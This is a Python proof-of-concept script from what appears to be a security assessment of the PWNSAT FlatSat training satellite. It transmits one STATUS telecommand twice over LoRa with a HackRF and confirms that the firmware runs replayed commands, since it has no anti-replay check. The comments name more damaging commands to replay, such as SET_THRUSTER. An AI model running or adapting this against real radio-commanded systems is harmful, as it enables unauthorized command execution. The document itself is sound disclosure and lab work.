#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 06_replay_rf.py -- no anti-replay protection (dossier finding #5). Root
# cause: New-firmware/worker.cpp's commandHandlerInternal() parses the SPP
# primary header's sequence_count (worker.cpp ~line 413) but ONLY ever
# uses it for a debug log line -- it's never compared against a
# last-seen/high-water-mark value, so there is no way for the firmware to
# tell "fresh command" from "a byte-exact copy of one it already executed
# an hour ago" apart. No firmware or ground-station changes were needed to
# build this attack: the vulnerability is already present in the REAL
# firmware (New-firmware/, not a debug variant) exactly as flashed today.
#
# What this proves: capture (or, as here, just build) ONE legitimate TC,
# transmit it once (the "real" send), then transmit the IDENTICAL raw
# bytes again later, unchanged -- same sequence_count, same payload, same
# AES ciphertext (ECB + no IV, so identical plaintext always encrypts to
# identical ciphertext too, see finding #12). If the firmware had any
# freshness/anti-replay check, the second copy would be rejected. It
# isn't -- the FlatSat processes it again and answers with a second,
# separate STATUS TM (its own outgoing TM sequence_count increments both
# times, and the embedded uptime_s field advances too, proving two
# genuinely separate executions of the same static command -- not one
# cached reply sent twice).
#
# Uses STATUS (TC APID 0x0C -> TM APID 0x0C) as the replayed command, NOT
# PING. PING was tried first and dropped: the firmware ALSO emits a PING
# TM on its own, automatically, every ~5s as part of the serial console's
# periodic "SYSTEM STATUS DASHBOARD" rotation (confirmed live -- a PING TM
# showed up on the wire before this script ever transmitted anything).
# Combined with PING ACK's payload being a fixed constant (no content that
# varies run to run), there is no way to tell "the FlatSat answering MY
# replayed command" apart from "a routine periodic ping that happened to
# land in the listen window" from the RF capture alone -- confirmation was
# structurally unreliable. STATUS doesn't have this problem: per
# PWNSAT-C3's own frontend (index.html, the comment above its periodic
# polling setIntervals), STATUS/GS_STATUS/PAYLOAD_STATUS are the three TM
# types confirmed command-response-only in this firmware -- worker.cpp's
# telemetryRadioWorker (the periodic dashboard driver) never calls
# telemetrySPPTransmitMissionStatus on its own. Any STATUS TM captured
# during this script's listen window is unambiguously a reply to a TC we
# just sent.
#
# This is deliberately NOT about which command is dangerous to replay
# (SET_THRUSTER or GS_ACCESS would be more "dangerous" targets) -- it's
# about proving the replay window exists at all, for ANY command,
# including ones with real side effects.
#
# Needs a Python with gnuradio importable -- run it and this script will
# say so with concrete next steps if you've got the wrong one, see
# require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3).

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

sys.stdout.reconfigure(line_buffering=True)

from pwnsat_packets import build_command_packet, decode_packet, decrypt_payload  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402
from pwnsat_catsniffer_rx import CatSnifferRX  # noqa: E402
from pwnsat_rtlsdr_rx import RtlSdrRX  # noqa: E402

STATUS_TM_APID = 0x0C  # SPP_APID_TM_STATUS -- command-response only, never periodic


def parse_status_tm(raw: bytes) -> dict:
    """Decrypts+unpacks a STATUS TM -- layout matches
    telemetrySPPTransmitMissionStatus() in worker.cpp: spacecraft_id(1)
    mode(1) flags(1) gps_status(1) beacon_interval_s(1) t0_power(1)
    t1_power(1) satellites(1) payload_fwd_count(u16 LE)
    last_payload_freq(u16 LE) uptime_s(u32 LE) ..."""
    pkt = decode_packet(raw)
    plain = decrypt_payload(pkt.data)
    if len(plain) < 16:
        raise ValueError(f"STATUS TM payload too short: {len(plain)} bytes")
    return {
        "mode": plain[1],
        "flags": plain[2],
        "uptime_s": int.from_bytes(plain[12:16], "little"),
        "tm_sequence_count": pkt.sequence_count,
    }


def find_status_reply(frames: list, verbose: bool):
    for frame in frames:
        raw = getattr(frame, "raw", frame)
        try:
            pkt = decode_packet(raw)
        except ValueError:
            continue
        if pkt.packet_type == 1:
            continue  # our own uplink leaking into the RX, see 00's classification note
        if pkt.apid != STATUS_TM_APID:
            continue
        try:
            return parse_status_tm(raw)
        except ValueError as exc:
            if verbose:
                print(f"    (STATUS-shaped frame, couldn't parse: {exc})")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1,
                        help="SPP sequence count for the ONE packet built -- both the "
                             "original send and the replay use these exact same bytes")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--replay-delay", type=float, default=5.0,
                        help="seconds to wait between the original send and the replay "
                             "(purely cosmetic -- stands in for 'an attacker recorded "
                             "this and replayed it later'; the firmware has no freshness "
                             "window to expire regardless of how long you wait, that's "
                             "the whole point)")
    parser.add_argument("--tx-gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--rx-device", choices=("rtlsdr", "catsniffer", "none"), default="rtlsdr",
                        help="dedicated RX radio to confirm both the original and the "
                             "replay actually got answered (default rtlsdr; stop C3's own "
                             "RTL-SDR bridge first if using this; pass 'none' to just fire "
                             "both transmissions blind and check the FlatSat's serial "
                             "console / PWNSAT-C3 by hand instead)")
    parser.add_argument("--catsniffer-port", default=None,
                        help="only used with --rx-device catsniffer")
    parser.add_argument("--rx-gain", type=int, default=30,
                        help="only used with --rx-device rtlsdr")
    parser.add_argument("--listen-seconds", type=float, default=1.5,
                        help="how long to wait after each TX before checking the RX")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output and the RX device's status messages")
    args = parser.parse_args()

    raw_spp = build_command_packet("status", seq=args.seq, encrypt=(args.encrypt == "on"))

    print("=" * 66)
    print("PWNSAT replay -- no anti-replay protection (finding #5)")
    print(f"ONE STATUS packet built ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")
    print("The exact same bytes above get transmitted TWICE -- once now, once again "
          f"after {args.replay_delay:.1f}s -- nothing is rebuilt or re-encrypted in between.")
    print("=" * 66)

    rx = None
    if args.rx_device != "none":
        if args.rx_device == "catsniffer":
            rx = CatSnifferRX(port=args.catsniffer_port, verbose=not args.quiet)
        else:
            rx = RtlSdrRX(rf_gain=args.rx_gain, verbose=not args.quiet)
        rx.start()
        time.sleep(0.5)

    def send_once(label: str) -> dict | None:
        print(f"\n[*] {label} -- transmitting the packet...")
        t0 = time.time()
        transmit_packet(raw_spp, frequency=args.frequency, device_args="hackrf",
                        tx_gain=args.tx_gain, verbose=not args.quiet)
        if rx is None:
            print(f"    -> sent in {time.time()-t0:.3f}s. --rx-device none, not confirmed "
                  f"-- check the FlatSat's serial console / PWNSAT-C3 by hand.")
            return None
        time.sleep(args.listen_seconds)
        frames = rx.take_since(t0)
        reply = find_status_reply(frames, verbose=not args.quiet)
        if reply is None:
            print("    -> no STATUS reply captured over RF (inconclusive -- this script's "
                  "own RX can miss a reply even when the FlatSat answered; check the "
                  "serial console / PWNSAT-C3 log before assuming this send was ignored).")
        else:
            print(f"    -> STATUS TM received. mode={reply['mode']} "
                  f"uptime_s={reply['uptime_s']} outgoing TM sequence_count="
                  f"{reply['tm_sequence_count']} -- STATUS is command-response only "
                  f"(never periodic), so this is unambiguously a reply to the packet "
                  f"we just sent, not background noise.")
        return reply

    first = send_once("Original send")
    print(f"\n[*] Waiting {args.replay_delay:.1f}s before replaying "
          f"(the firmware has no window for this to expire)...")
    time.sleep(args.replay_delay)
    second = send_once("Replay (byte-identical retransmission)")

    print("\n" + "=" * 66)
    if rx is None:
        print("[?] --rx-device none -- both sends went out, neither confirmed by this "
              "script. Check that PWNSAT-C3 / the serial console logged TWO separate "
              "STATUS TMs for the one packet above.")
    elif first and second:
        if second["tm_sequence_count"] != first["tm_sequence_count"] and second["uptime_s"] >= first["uptime_s"]:
            print(f"[+] REPLAY ACCEPTED: identical TC bytes answered twice -- outgoing TM "
                  f"sequence_count went {first['tm_sequence_count']} -> "
                  f"{second['tm_sequence_count']}, uptime_s went {first['uptime_s']} -> "
                  f"{second['uptime_s']}. Two genuinely separate, real executions of the "
                  f"same static command -- confirms the FlatSat has no replay window.")
        else:
            print("[?] Got two STATUS replies but the sequence/uptime didn't advance as "
                  "expected -- unexpected, look at the raw frames above before drawing a "
                  "conclusion.")
    else:
        print("[?] Couldn't confirm one or both sends over RF -- inconclusive, NOT "
              "necessarily a failure (see the per-send notes above). Check the serial "
              "console / PWNSAT-C3 log directly for two STATUS TM entries.")
    print("=" * 66)

    if rx is not None:
        rx.close()


if __name__ == "__main__":
    main()
